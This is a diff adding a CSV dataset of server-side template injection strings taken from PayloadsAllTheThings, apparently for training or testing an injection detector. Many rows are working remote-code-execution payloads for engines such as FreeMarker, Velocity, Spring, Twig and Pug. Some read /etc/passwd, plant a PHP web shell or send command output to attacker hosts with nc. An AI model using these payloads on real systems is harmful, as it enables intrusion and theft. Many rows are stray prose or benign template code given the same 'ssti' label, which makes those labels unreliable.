@@ -1,0 +1,530 @@
+payload,label,source
+@(1+2),ssti,payloads_all_the_things
+@{,ssti,payloads_all_the_things
+// C# code,ssti,payloads_all_the_things
+-in-ASP.NET-Razor/),ssti,payloads_all_the_things
+<%= %>,ssti,payloads_all_the_things
+"elem(System.shell(""id""), 0) # Rendered RCE",ssti,payloads_all_the_things
+"[1, 2][elem(System.shell(""id""), 0)] # Error-Based RCE",ssti,payloads_all_the_things
+"1/((elem(System.shell(""id""), 1) == 0)&&1||0) # Boolean-Based RCE",ssti,payloads_all_the_things
+"elem(System.shell(""id && sleep 5""), 0) # Time-Based RCE",ssti,payloads_all_the_things
+<%= 7 * 7 %>,ssti,payloads_all_the_things
+"<%= File.read!(""/etc/passwd"") %>",ssti,payloads_all_the_things
+"<%= elem(System.shell(""id""), 0) %> # Rendered RCE",ssti,payloads_all_the_things
+"<%= [1, 2][elem(System.shell(""id""), 0)] %> # Error-Based RCE",ssti,payloads_all_the_things
+"<%= 1/((elem(System.shell(""id""), 1) == 0)&&1||0) %> # Boolean-Based RCE",ssti,payloads_all_the_things
+"<%= elem(System.shell(""id && sleep 5""), 0) %> # Time-Based RCE",ssti,payloads_all_the_things
+#{ },ssti,payloads_all_the_things
+${ },ssti,payloads_all_the_things
+[= ],ssti,payloads_all_the_things
+{{ }},ssti,payloads_all_the_things
+*{ },ssti,payloads_all_the_things
+[[ ]],ssti,payloads_all_the_things
+"#set($X="""") $X",ssti,payloads_all_the_things
+${...},ssti,payloads_all_the_things
+#{...},ssti,payloads_all_the_things
+*{...},ssti,payloads_all_the_things
+@{...},ssti,payloads_all_the_things
+~{...},ssti,payloads_all_the_things
+${7*7},ssti,payloads_all_the_things
+${{7*7}},ssti,payloads_all_the_things
+${class.getClassLoader()},ssti,payloads_all_the_things
+"${class.getResource("""").getPath()}",ssti,payloads_all_the_things
+"${class.getResource(""../../../../../index.htm"").getContent()}",ssti,payloads_all_the_things
+${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE,ssti,payloads_all_the_things
+${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE,ssti,payloads_all_the_things
+${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE,ssti,payloads_all_the_things
+${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE,ssti,payloads_all_the_things
+${3*3},ssti,payloads_all_the_things
+Default: `${3*3}`,ssti,payloads_all_the_things
+#{3*3},ssti,payloads_all_the_things
+Legacy: `#{3*3}`,ssti,payloads_all_the_things
+[=3*3],ssti,payloads_all_the_things
+Alternative: `[=3*3]` since,ssti,payloads_all_the_things
+"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join("" "")}",ssti,payloads_all_the_things
+Convert the returned bytes to ASCII,ssti,payloads_all_the_things
+"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",ssti,payloads_all_the_things
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},ssti,payloads_all_the_things
+"${""freemarker.template.utility.Execute""?new()(""id"")}",ssti,payloads_all_the_things
+"#{""freemarker.template.utility.Execute""?new()(""id"")}",ssti,payloads_all_the_things
+"[=""freemarker.template.utility.Execute""?new()(""id"")]",ssti,payloads_all_the_things
+"${(""xx""+(""freemarker.template.utility.Execute""?new()(""id"")))?new()} // Error-Based RCE",ssti,payloads_all_the_things
+"${1/((freemarker.template.utility.Execute""?new()("" … && echo UniqueString"")?chop_linebreak?ends_with(""UniqueString""))?string('1','0')?eval)} // Boolean-Based RCE",ssti,payloads_all_the_things
+"${""freemarker.template.utility.Execute""?new()(""id && sleep 5"")} // Time-Based RCE",ssti,payloads_all_the_things
+${9?lower_abc+4?lower_abc)},ssti,payloads_all_the_things
+${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)},ssti,payloads_all_the_things
+<#assign classloader=article.class.protectionDomain.classLoader>,ssti,payloads_all_the_things
+"<#assign owc=classloader.loadClass(""freemarker.template.ObjectWrapper"")>",ssti,payloads_all_the_things
+"<#assign dwf=owc.getField(""DEFAULT_WRAPPER"").get(null)>",ssti,payloads_all_the_things
+"<#assign ec=classloader.loadClass(""freemarker.template.utility.Execute"")>",ssti,payloads_all_the_things
+"${dwf.newInstance(ec,null)(""id"")}",ssti,payloads_all_the_things
+{{'a'.toUpperCase()}} would result in 'A',ssti,payloads_all_the_things
+{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206,ssti,payloads_all_the_things
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",ssti,payloads_all_the_things
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",ssti,payloads_all_the_things
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",ssti,payloads_all_the_things
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",ssti,payloads_all_the_things
+{{ someString.toUPPERCASE() }},ssti,payloads_all_the_things
+{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }},ssti,payloads_all_the_things
+{% set cmd = 'id' %},ssti,payloads_all_the_things
+{% set bytes = (1).TYPE,ssti,payloads_all_the_things
+.forName('java.lang.Runtime'),ssti,payloads_all_the_things
+.methods[6],ssti,payloads_all_the_things
+".invoke(null,null)",ssti,payloads_all_the_things
+.exec(cmd),ssti,payloads_all_the_things
+.inputStream,ssti,payloads_all_the_things
+.readAllBytes() %},ssti,payloads_all_the_things
+{{ (1).TYPE,ssti,payloads_all_the_things
+.forName('java.lang.String'),ssti,payloads_all_the_things
+.constructors[0],ssti,payloads_all_the_things
+.newInstance(([bytes]).toArray()) }},ssti,payloads_all_the_things
+"#set($str=$class.inspect(""java.lang.String"").type)",ssti,payloads_all_the_things
+"#set($chr=$class.inspect(""java.lang.Character"").type)",ssti,payloads_all_the_things
+"#set($ex=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""whoami""))",ssti,payloads_all_the_things
+$ex.waitFor(),ssti,payloads_all_the_things
+#set($out=$ex.getInputStream()),ssti,payloads_all_the_things
+#foreach($i in [1..$out.available()]),ssti,payloads_all_the_things
+$str.valueOf($chr.toChars($out.read())),ssti,payloads_all_the_things
+#end,ssti,payloads_all_the_things
+"echo ""a"" > /tmp/a",ssti,payloads_all_the_things
+#set($base64EncodedCommand = 'd2hvYW1p'),ssti,payloads_all_the_things
+#set($contextObjectClass = $knownContextObject.getClass()),ssti,payloads_all_the_things
+"#set($Base64Class = $contextObjectClass.forName(""java.util.Base64""))",ssti,payloads_all_the_things
+"#set($Base64Decoder = $Base64Class.getMethod(""getDecoder"").invoke(null))",ssti,payloads_all_the_things
+#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand)),ssti,payloads_all_the_things
+"#set($StringClass = $contextObjectClass.forName(""java.lang.String""))",ssti,payloads_all_the_things
+"#set($command = $StringClass.getConstructor($contextObjectClass.forName(""[B""), $contextObjectClass.forName(""java.lang.String"")).newInstance($decodedBytes, ""UTF-8""))",ssti,payloads_all_the_things
+"#set($commandArgs = [""/bin/sh"", ""-c"", $command])",ssti,payloads_all_the_things
+"#set($ProcessBuilderClass = $contextObjectClass.forName(""java.lang.ProcessBuilder""))",ssti,payloads_all_the_things
+"#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName(""java.util.List"")).newInstance($commandArgs))",ssti,payloads_all_the_things
+#set($processBuilder = $processBuilder.redirectErrorStream(true)),ssti,payloads_all_the_things
+#set($process = $processBuilder.start()),ssti,payloads_all_the_things
+#set($exitCode = $process.waitFor()),ssti,payloads_all_the_things
+#set($inputStream = $process.getInputStream()),ssti,payloads_all_the_things
+"#set($ScannerClass = $contextObjectClass.forName(""java.util.Scanner""))",ssti,payloads_all_the_things
+"#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName(""java.io.InputStream"")).newInstance($inputStream))",ssti,payloads_all_the_things
+"#set($scannerDelimiter = $scanner.useDelimiter(""\\A""))",ssti,payloads_all_the_things
+#if($scanner.hasNext()),ssti,payloads_all_the_things
+#set($output = $scanner.next().trim()),ssti,payloads_all_the_things
+"$output.replaceAll(""\\s+$"", """").replaceAll(""^\\s+"", """")",ssti,payloads_all_the_things
+"#set($s="""")",ssti,payloads_all_the_things
+"#set($sc=$s.getClass().getConstructor($s.getClass().forName(""[B""), $s.getClass()))",ssti,payloads_all_the_things
+"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id"")",ssti,payloads_all_the_things
+#set($n=$p.waitFor()),ssti,payloads_all_the_things
+"#set($b=""Y:/A:/""+$sc.newInstance($p.inputStream.readAllBytes(), ""UTF-8""))",ssti,payloads_all_the_things
+#include($b),ssti,payloads_all_the_things
+"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id""))",ssti,payloads_all_the_things
+#set($r=$p.exitValue()),ssti,payloads_all_the_things
+#if($r != 0),ssti,payloads_all_the_things
+"#include(""Y:/A:/xxx"")",ssti,payloads_all_the_things
+"#set($t=$s.getClass().forName(""java.lang.Thread"").sleep(5000))",ssti,payloads_all_the_things
+${9*9},ssti,payloads_all_the_things
+${String x = new File('c:/windows/notepad.exe').text},ssti,payloads_all_the_things
+${String x = new File('/path/to/file').getText('UTF-8')},ssti,payloads_all_the_things
+"${new File(""C:\Temp\FileName.txt"").createNewFile();}",ssti,payloads_all_the_things
+"${""http://www.google.com"".toURL().text}",ssti,payloads_all_the_things
+"${new URL(""http://www.google.com"").getText()}",ssti,payloads_all_the_things
+"${""calc.exe"".exec()}",ssti,payloads_all_the_things
+"${""calc.exe"".execute()}",ssti,payloads_all_the_things
+"${this.evaluate(""9*9"") //(this is a Script class)}",ssti,payloads_all_the_things
+"${new org.codehaus.groovy.runtime.MethodClosure(""calc.exe"",""execute"").call()}",ssti,payloads_all_the_things
+${((char)105).toString()+((char)100).toString()},ssti,payloads_all_the_things
+"${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}",ssti,payloads_all_the_things
+"${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(""whoami"")})",ssti,payloads_all_the_things
+def x },ssti,payloads_all_the_things
+"${ new groovy.lang.GroovyClassLoader().parseClass(""@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\""calc.exe\"")})def x"") }",ssti,payloads_all_the_things
+"${'patt'.toString().replace('a', 'x')}",ssti,payloads_all_the_things
+${T(java.lang.Integer).valueOf('1')},ssti,payloads_all_the_things
+${T(java.lang.System).getenv()},ssti,payloads_all_the_things
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')},ssti,payloads_all_the_things
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},ssti,payloads_all_the_things
+"${"""".getClass().forName(""java.net.InetAddress"").getMethod(""getByName"","""".getClass()).invoke("""",""[ATTACKER.DOMAIN.TLD]"")}",ssti,payloads_all_the_things
+"${pageContext.request.getSession().setAttribute(""admin"",true)}",ssti,payloads_all_the_things
+Method using `java.lang.Runtime` #1 - accessed with JavaClass,ssti,payloads_all_the_things
+"${T(java.lang.Runtime).getRuntime().exec(""whoami"")}",ssti,payloads_all_the_things
+Method using `java.lang.Runtime` #2,ssti,payloads_all_the_things
+"#{session.setAttribute(""rtc"","""".getClass().forName(""java.lang.Runtime"").getDeclaredConstructors()[0])}",ssti,payloads_all_the_things
+"#{session.getAttribute(""rtc"").setAccessible(true)}",ssti,payloads_all_the_things
+"#{session.getAttribute(""rtc"").getRuntime().exec(""/bin/bash -c whoami"")}",ssti,payloads_all_the_things
+Method using `java.lang.Runtime` #3 - accessed with `invoke`,ssti,payloads_all_the_things
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')},ssti,payloads_all_the_things
+javax.script.ScriptEngineManager,ssti,payloads_all_the_things
+Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`,ssti,payloads_all_the_things
+"${request.getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""js"").eval(""java.lang.Runtime.getRuntime().exec(\\\""whoami\\\"")""))}",ssti,payloads_all_the_things
+Method using `java.lang.ProcessBuilder`,ssti,payloads_all_the_things
+"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}",ssti,payloads_all_the_things
+"${request.getAttribute(""c"").add(""cmd.exe"")}",ssti,payloads_all_the_things
+"${request.getAttribute(""c"").add(""/k"")}",ssti,payloads_all_the_things
+"${request.getAttribute(""c"").add(""whoami"")}",ssti,payloads_all_the_things
+"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}",ssti,payloads_all_the_things
+"${request.getAttribute(""a"")}",ssti,payloads_all_the_things
+"${T(java.lang.Integer).valueOf(""x""+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec(""id"").inputStream.readAllBytes()))}",ssti,payloads_all_the_things
+"${1/((T(java.lang.Runtime).getRuntime().exec(""id"").waitFor()==0)?1:0)+""""}",ssti,payloads_all_the_things
+"${(T(java.lang.Runtime).getRuntime().exec(""id"").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}",ssti,payloads_all_the_things
+7*7,ssti,payloads_all_the_things
+"'patt'.toString().replace('a', 'x')",ssti,payloads_all_the_things
+@java.lang.Integer@valueOf('1'),ssti,payloads_all_the_things
+"new String(@java.lang.Runtime@getRuntime().exec(""id"").getInputStream().readAllBytes())",ssti,payloads_all_the_things
+"(new String(@java.lang.Runtime@getRuntime().exec(""id"").getInputStream().readAllBytes()))/0",ssti,payloads_all_the_things
+"1/((@java.lang.Runtime@getRuntime().exec(""id"").waitFor()==0)?1:0)+""""",ssti,payloads_all_the_things
+"((@java.lang.Runtime@getRuntime().exec(""id"").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)",ssti,payloads_all_the_things
+{{= }},ssti,payloads_all_the_things
+{ },ssti,payloads_all_the_things
+<% %>,ssti,payloads_all_the_things
+"#=set($X="""")$X",ssti,payloads_all_the_things
+// Rendered RCE,ssti,payloads_all_the_things
+"global.process.mainModule.require(""child_process"").execSync(""id"").toString()",ssti,payloads_all_the_things
+// Error-Based RCE,ssti,payloads_all_the_things
+"global.process.mainModule.require(""Y:/A:/""+global.process.mainModule.require(""child_process"").execSync(""id"").toString())",ssti,payloads_all_the_things
+"""""[""x""][global.process.mainModule.require(""child_process"").execSync(""id"").toString()]",ssti,payloads_all_the_things
+// Boolean-Based RCE,ssti,payloads_all_the_things
+"[""""][0 + !(global.process.mainModule.require(""child_process"").spawnSync(""id"", options={shell:true}).status===0)][""length""]",ssti,payloads_all_the_things
+// Time-Based RCE,ssti,payloads_all_the_things
+"global.process.mainModule.require(""child_process"").execSync(""id && sleep 5"").toString()",ssti,payloads_all_the_things
+{{range.constructor(' ... ')()}},ssti,payloads_all_the_things
+{{this}},ssti,payloads_all_the_things
+{{self}},ssti,payloads_all_the_things
+>= 4.1.0,ssti,payloads_all_the_things
+< 4.1.2,ssti,payloads_all_the_things
+"`>= 4.1.0`, `< 4.1.2`",ssti,payloads_all_the_things
+>= 4.0.0,ssti,payloads_all_the_things
+< 4.0.14,ssti,payloads_all_the_things
+"`>= 4.0.0`, `< 4.0.14`",ssti,payloads_all_the_things
+< 3.0.7,ssti,payloads_all_the_things
+`< 3.0.7`,ssti,payloads_all_the_things
+"{{#with ""s"" as |string|}}",ssti,payloads_all_the_things
+"{{#with ""e""}}",ssti,payloads_all_the_things
+{{#with split as |conslist|}},ssti,payloads_all_the_things
+{{this.pop}},ssti,payloads_all_the_things
+"{{this.push (lookup string.sub ""constructor"")}}",ssti,payloads_all_the_things
+{{#with string.split as |codelist|}},ssti,payloads_all_the_things
+"{{this.push ""return require('child_process').execSync('ls -la');""}}",ssti,payloads_all_the_things
+{{#each conslist}},ssti,payloads_all_the_things
+{{#with (string.sub.apply 0 codelist)}},ssti,payloads_all_the_things
+{{/with}},ssti,payloads_all_the_things
+{{/each}},ssti,payloads_all_the_things
+const _ = require('lodash');,ssti,payloads_all_the_things
+"string = ""{{= username}}""",ssti,payloads_all_the_things
+const options = {,ssti,payloads_all_the_things
+"evaluate: /\{\{(.+?)\}\}/g,",ssti,payloads_all_the_things
+"interpolate: /\{\{=(.+?)\}\}/g,",ssti,payloads_all_the_things
+"escape: /\{\{-(.+?)\}\}/g,",ssti,payloads_all_the_things
+"_.template(string, options);",ssti,payloads_all_the_things
+**string:** The template string.,ssti,payloads_all_the_things
+**options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.,ssti,payloads_all_the_things
+**options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.,ssti,payloads_all_the_things
+**options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.,ssti,payloads_all_the_things
+{{= _.VERSION}},ssti,payloads_all_the_things
+${= _.VERSION},ssti,payloads_all_the_things
+<%= _.VERSION %>,ssti,payloads_all_the_things
+{{= _.templateSettings.evaluate }},ssti,payloads_all_the_things
+"{{x=Object}}{{w=a=new x}}{{w.type=""pipe""}}{{w.readable=1}}{{w.writable=1}}{{a.file=""/bin/sh""}}{{a.args=[""/bin/sh"",""-c"",""id;ls""]}}{{a.stdio=[w,w]}}{{process.binding(""spawn_sync"").spawn(a).output}}",ssti,payloads_all_the_things
+- var x = root.process,ssti,payloads_all_the_things
+- x = x.mainModule.require,ssti,payloads_all_the_things
+- x = x('child_process'),ssti,payloads_all_the_things
+= x.exec('id | nc attacker.net 80'),ssti,payloads_all_the_things
+"#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}",ssti,payloads_all_the_things
+<?= ?>,ssti,payloads_all_the_things
+shell_exec('id'),ssti,payloads_all_the_things
+system('id'),ssti,payloads_all_the_things
+"ini_set(""error_reporting"", ""1"") // Enable verbose fatal errors for Error-Based",ssti,payloads_all_the_things
+"call_user_func(join("""", [""xx"", shell_exec('id')]))",ssti,payloads_all_the_things
+"1 / (pclose(popen(""id"", ""wb"")) == 0)",ssti,payloads_all_the_things
+shell_exec('id && sleep 5'),ssti,payloads_all_the_things
+system('id && sleep 5'),ssti,payloads_all_the_things
+"{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}",ssti,payloads_all_the_things
+"{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}",ssti,payloads_all_the_things
+{$smarty.version},ssti,payloads_all_the_things
+{php}echo `id`;{/php} //deprecated in smarty v3,ssti,payloads_all_the_things
+"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET['cmd']); ?>"",self::clearConfig())}",ssti,payloads_all_the_things
+"{system('ls')} // compatible v3, deprecated in v5",ssti,payloads_all_the_things
+"{system('cat index.php')} // compatible v3, deprecated in v5",ssti,payloads_all_the_things
+{chr(105)|cat:chr(100)},ssti,payloads_all_the_things
+"{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}",ssti,payloads_all_the_things
+{{7*7}},ssti,payloads_all_the_things
+{{7*'7'}} would result in 49,ssti,payloads_all_the_things
+{{dump(app)}},ssti,payloads_all_the_things
+{{dump(_context)}},ssti,payloads_all_the_things
+"{{app.request.server.all|join(',')}}",ssti,payloads_all_the_things
+$output = $twig > render (,ssti,payloads_all_the_things
+"'Dear' . $_GET['custom_greeting'],",ssti,payloads_all_the_things
+"array(""first_name"" => $user.first_name)",ssti,payloads_all_the_things
+"""Dear {first_name}"",",ssti,payloads_all_the_things
+"""{{'/etc/passwd'|file_excerpt(1,30)}}""@",ssti,payloads_all_the_things
+"{{include(""wp-config.php"")}}",ssti,payloads_all_the_things
+"{{_self.env.setCache(""ftp://attacker.net:2121"")}}{{_self.env.loadTemplate(""backdoor"")}}",ssti,payloads_all_the_things
+"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",ssti,payloads_all_the_things
+{{['id']|filter('system')}},ssti,payloads_all_the_things
+"{{[0]|reduce('system','id')}}",ssti,payloads_all_the_things
+{{['id']|map('system')|join}},ssti,payloads_all_the_things
+"{{['id',1]|sort('system')|join}}",ssti,payloads_all_the_things
+{{['cat\x20/etc/passwd']|filter('system')}},ssti,payloads_all_the_things
+{{['cat$IFS/etc/passwd']|filter('system')}},ssti,payloads_all_the_things
+{{['id']|filter('passthru')}},ssti,payloads_all_the_things
+{{['id']|map('passthru')}},ssti,payloads_all_the_things
+{{['nslookup oastify.com']|filter('system')}},ssti,payloads_all_the_things
+"{% for a in [""error_reporting"", ""1""]|sort(""ini_set"") %}{% endfor %} // Enable verbose error output for Error-Based",ssti,payloads_all_the_things
+"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{%include [""Y:/A:/"", _self.env.getFilter(""id"")]|join%} // Error-Based RCE <= 1.19",ssti,payloads_all_the_things
+"{{[0]|map([""xx"", {""id"": ""shell_exec""}|map(""call_user_func"")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0",ssti,payloads_all_the_things
+"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{{1/(_self.env.getFilter(""id && echo UniqueString"")|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE <= 1.19",ssti,payloads_all_the_things
+"{{1/({""id && echo UniqueString"":""shell_exec""}|map(""call_user_func"")|join|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0",ssti,payloads_all_the_things
+"{% set a = [""error_reporting"", ""1""]|sort(""ini_set"") %}{% set b = [""ob_start"", ""call_user_func""]|sort(""call_user_func"") %}{{ [""id"", 0]|sort(""system"") }}{% set a = [""ob_end_flush"", []]|sort(""call_user_func_array"")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614",ssti,payloads_all_the_things
+"{{ 1 / ([""id >>/dev/null && echo -n 1"", ""0""]|sort(""system"")|first == ""0"") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614",ssti,payloads_all_the_things
+{{ {'id':'shell_exec'}|map('call_user_func')|join }},ssti,payloads_all_the_things
+FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }},ssti,payloads_all_the_things
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1,ssti,payloads_all_the_things
+"email=""{{app.request.query.filter(0,0,1024,{'options':'system'})}}""@attacker.tld",ssti,payloads_all_the_things
+{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}},ssti,payloads_all_the_things
+"{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}",ssti,payloads_all_the_things
+"{var $X=""POC""}{$X}",ssti,payloads_all_the_things
+{php system('nslookup oastify.com')},ssti,payloads_all_the_things
+"<patTemplate:tmpl name=""page"">",ssti,payloads_all_the_things
+This is the main page.,ssti,payloads_all_the_things
+"<patTemplate:tmpl name=""foo"">",ssti,payloads_all_the_things
+It contains another template.,ssti,payloads_all_the_things
+</patTemplate:tmpl>,ssti,payloads_all_the_things
+"<patTemplate:tmpl name=""hello"">",ssti,payloads_all_the_things
+Hello {NAME}.<br/>,ssti,payloads_all_the_things
+<head><title>{PAGE_TITLE}</title></head>,ssti,payloads_all_the_things
+<table>,ssti,payloads_all_the_things
+<caption>Authors</caption>,ssti,payloads_all_the_things
+<thead>,ssti,payloads_all_the_things
+<tr><th>Name</th><th>Email</th></tr>,ssti,payloads_all_the_things
+</thead>,ssti,payloads_all_the_things
+<tfoot>,ssti,payloads_all_the_things
+"<tr><td colspan=""2"">{NUM_AUTHORS}</td></tr>",ssti,payloads_all_the_things
+</tfoot>,ssti,payloads_all_the_things
+<tbody>,ssti,payloads_all_the_things
+<!-- BEGIN authorline -->,ssti,payloads_all_the_things
+<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>,ssti,payloads_all_the_things
+<!-- END authorline -->,ssti,payloads_all_the_things
+</tbody>,ssti,payloads_all_the_things
+</table>,ssti,payloads_all_the_things
+//we want to display this author list,ssti,payloads_all_the_things
+$authors = array(,ssti,payloads_all_the_things
+"'Christian Weiske'  => 'cweiske@php.net',",ssti,payloads_all_the_things
+'Bjoern Schotte'     => 'schotte@mayflower.de',ssti,payloads_all_the_things
+require_once 'HTML/Template/PHPLIB.php';,ssti,payloads_all_the_things
+//create template object,ssti,payloads_all_the_things
+"$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');",ssti,payloads_all_the_things
+//load file,ssti,payloads_all_the_things
+"$t->setFile('authors', 'authors.tpl');",ssti,payloads_all_the_things
+//set block,ssti,payloads_all_the_things
+"$t->setBlock('authors', 'authorline', 'authorline_ref');",ssti,payloads_all_the_things
+//set some variables,ssti,payloads_all_the_things
+"$t->setVar('NUM_AUTHORS', count($authors));",ssti,payloads_all_the_things
+"$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));",ssti,payloads_all_the_things
+//display the authors,ssti,payloads_all_the_things
+foreach ($authors as $name => $email) {,ssti,payloads_all_the_things
+"$t->setVar('AUTHOR_NAME', $name);",ssti,payloads_all_the_things
+"$t->setVar('AUTHOR_EMAIL', $email);",ssti,payloads_all_the_things
+"$t->parse('authorline_ref', 'authorline', true);",ssti,payloads_all_the_things
+//finish and echo,ssti,payloads_all_the_things
+"echo $t->finish($t->parse('OUT', 'authors'));",ssti,payloads_all_the_things
+// Create new Plates instance,ssti,payloads_all_the_things
+$templates = new League\Plates\Engine('/path/to/templates');,ssti,payloads_all_the_things
+// Render a template,ssti,payloads_all_the_things
+"echo $templates->render('profile', ['name' => 'Jonathan']);",ssti,payloads_all_the_things
+"<?php $this->layout('template', ['title' => 'User Profile']) ?>",ssti,payloads_all_the_things
+<h1>User Profile</h1>,ssti,payloads_all_the_things
+"<p>Hello, <?=$this->e($name)?></p>",ssti,payloads_all_the_things
+<title><?=$this->e($title)?></title>,ssti,payloads_all_the_things
+<?=$this->section('content')?>,ssti,payloads_all_the_things
+"__include__(""os"").popen(""id"").read() # Rendered RCE",ssti,payloads_all_the_things
+"getattr("""", ""x"" + __include__(""os"").popen(""id"").read()) # Error-Based RCE",ssti,payloads_all_the_things
+"1 / (__include__(""os"").popen(""id"")._proc.wait() == 0) # Boolean-Based RCE",ssti,payloads_all_the_things
+"__include__(""os"").popen(""id && sleep 5"").read() # Time-Based RCE",ssti,payloads_all_the_things
+{% csrf_token %} # Causes error with Jinja2,ssti,payloads_all_the_things
+{{ 7*7 }}  # Error with Django Templates,ssti,payloads_all_the_things
+ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,ssti,payloads_all_the_things
+{{ '<script>alert(3)</script>' }},ssti,payloads_all_the_things
+{{ '<script>alert(3)</script>' | safe }},ssti,payloads_all_the_things
+{% debug %},ssti,payloads_all_the_things
+{{ messages.storages.0.signer.key }},ssti,payloads_all_the_things
+{% include 'admin/base.html' %},ssti,payloads_all_the_things
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %},ssti,payloads_all_the_things
+{{e.user.get_username}} : {{e.user.password}}{% endfor %},ssti,payloads_all_the_things
+{% get_admin_log 10 as admin_log for_user user %},ssti,payloads_all_the_things
+{{4*4}}[[5*5]],ssti,payloads_all_the_things
+{{7*'7'}} would result in 7777777,ssti,payloads_all_the_things
+{{config.items()}},ssti,payloads_all_the_things
+"{% extends ""layout.html"" %}",ssti,payloads_all_the_things
